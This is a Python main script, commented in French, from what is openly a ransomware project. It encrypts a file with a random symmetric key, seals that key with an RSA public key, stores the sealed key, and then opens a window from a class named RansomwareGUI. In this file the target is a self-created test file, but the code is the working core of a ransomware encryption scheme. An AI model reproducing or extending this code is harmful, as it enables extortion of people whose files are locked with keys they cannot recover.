import tkinter as tk
from gui import RansomwareGUI
import os
import sys
# Ajouter le répertoire parent au chemin de recherche des modules
parent_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.append(parent_dir)
from utils import resource_path
from encryption import encrypt_file
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend

def main():
    # Créer le fichier example.txt avec du contenu de test
    file_path = 'example.txt'
    if not os.path.exists(file_path):
        with open(file_path, 'w') as file:
            file.write("Ceci est un fichier de test.")

    # Générer la clé symétrique
    symmetric_key = os.urandom(32)

    # Chiffrer le fichier example.txt avec la clé symétrique
    encrypt_file(file_path, symmetric_key)

    # Charger la clé publique RSA
    public_key_path = resource_path('keys/public_key.pem')
    #public_key_path = os.path.join(os.path.dirname(__file__), '..', 'keys', 'public_key.pem')
    with open(public_key_path, 'rb') as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )

    # Chiffrer la clé symétrique avec la clé publique RSA
    encrypted_symmetric_key = public_key.encrypt(
        symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Sauvegarder la clé symétrique chiffrée
    encrypted_symmetric_key_path = resource_path('keys/encrypted_symmetric_key.bin')
    #encrypted_symmetric_key_path = os.path.join(os.path.dirname(__file__), '..', 'keys', 'encrypted_symmetric_key.bin')
    with open(encrypted_symmetric_key_path, 'wb') as key_file:
        key_file.write(encrypted_symmetric_key)

    # Lancer l'interface graphique
    root = tk.Tk()
    app = RansomwareGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
